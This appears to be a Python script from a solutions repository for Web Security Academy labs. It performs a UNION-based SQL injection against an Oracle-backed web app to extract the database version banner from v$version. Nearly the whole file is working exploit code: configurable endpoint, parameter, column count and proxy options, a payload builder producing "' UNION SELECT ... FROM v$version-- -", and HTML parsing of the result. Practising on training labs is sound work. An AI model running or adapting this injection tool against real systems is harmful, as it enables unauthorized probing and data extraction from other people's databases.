# src/sqli/lab_oracle_version.py
from __future__ import annotations

import argparse
import sys
import re

from bs4 import BeautifulSoup

from src.common.cli_utils import build_cli_client, parse_keyvals
from src.common.http_utils import HttpClient
from src.sqli.sqli_utils import sqli_inject


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="SQLi (Oracle): Extract database version from v$version via UNION-based injection."
    )

    # positional
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")

    # injection configuration
    _ = p.add_argument("--endpoint", default="/filter", help="Endpoint path (default: %(default)s)")
    _ = p.add_argument(
        "--param-name", default="category", help="Parameter name (default: %(default)s)"
    )
    _ = p.add_argument(
        "--base-value", default="Gifts", help="Benign base value (default: %(default)s)"
    )
    _ = p.add_argument(
        "--method",
        choices=["GET", "POST"],
        default="GET",
        help="HTTP method (default: %(default)s)",
    )
    _ = p.add_argument(
        "--inject",
        choices=["query", "body"],
        default="query",
        help="Where to inject payload (default: %(default)s)",
    )

    # payload shape
    _ = p.add_argument(
        "--columns",
        type=int,
        default=2,
        help="Total number of columns from detection step (default: %(default)s)",
    )
    _ = p.add_argument(
        "--string-col",
        type=int,
        default=1,
        help="Index (1-based) of the column that renders text (default: %(default)s)",
    )

    # plumbing
    _ = p.add_argument("--proxy", default=None, help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)")
    _ = p.add_argument(
        "--insecure", action="store_true", help="Disable TLS verification (useful with Burp)."
    )
    _ = p.add_argument(
        "--timeout", type=float, default=10.0, help="HTTP timeout in seconds (default: %(default)s)"
    )

    # optional extras
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value")
    _ = p.add_argument(
        "--base-param",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Additional baseline params (repeatable). Applies to query/body.",
    )

    return p.parse_args(argv)


ORACLE_MARKER_RE = re.compile(r"Oracle\s+Database", re.IGNORECASE)


def extract_oracle_version(html: str) -> str | None:
    """Extract a line containing the Oracle Database banner/version from HTML."""
    soup = BeautifulSoup(html, "html.parser")

    # 1) Direct text node match anywhere
    node = soup.find(string=ORACLE_MARKER_RE)
    if node and node.strip():
        return node.strip()

    # 2) Common case: result in a <td> cell
    td = soup.find("td", string=ORACLE_MARKER_RE)
    if td:
        return td.get_text(strip=True)

    # 3) Fallback: scan all visible text chunks for a match
    for t in soup.stripped_strings:
        if ORACLE_MARKER_RE.search(t):
            return t.strip()

    return None


def exploit_oracle_version(
    client: HttpClient,
    *,
    endpoint: str,
    param_name: str,
    base_value: str,
    method: str,
    inject: str,
    columns: int,
    string_col: int,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
) -> str | None:
    """
    Perform UNION-based injection selecting the Oracle banner from v$version.
    Returns the matched banner/version line if found, else None.
    """
    # Construct UNION SELECT with 'banner' placed into the text-rendering column.
    select_parts = ["NULL"] * columns
    select_parts[string_col - 1] = "banner"
    union_clause = ", ".join(select_parts)

    # Oracle comment tail with space-dash to be robust on filters
    payload = f"{base_value}' UNION SELECT {union_clause} FROM v$version-- -"

    res = sqli_inject(
        client,
        payload=payload,
        method=method,
        endpoint=endpoint,
        inject=inject,
        param_name=param_name,
        base_params=base_params,
        extra_headers=headers,
        cookies=cookies,
        success_marker="Oracle Database",  # quick success gate
    )

    if not res.success:
        return None

    return extract_oracle_version(res.body)


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    cookies = parse_keyvals(args.cookie, "=")
    headers = parse_keyvals(args.header, ":")
    base_params = parse_keyvals(args.base_param, "=")

    print("[+] Dumping Oracle database version via UNION SELECT from v$version...")

    try:
        version = exploit_oracle_version(
            client,
            endpoint=args.endpoint,
            param_name=args.param_name,
            base_value=args.base_value,
            method=args.method,
            inject=args.inject,
            columns=args.columns,
            string_col=args.string_col,
            base_params=base_params,
            cookies=cookies,
            headers=headers,
        )
    except Exception as exc:
        print(f"[-] Request failed: {exc}")
        return 2

    if version:
        print(f"[+] Oracle version/banner: {version}")
        return 0
    else:
        print("[-] Unable to extract Oracle version.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

# Usage example
# python -m src.sqli.lab06.py \
# https://TARGET.web-security-academy.net \
# --endpoint /filter \
# --param-name category \
# --base-value Gifts \
# --columns 2 \
# --string-col 1 \
# --proxy http://127.0.0.1:8080 \
# --insecure
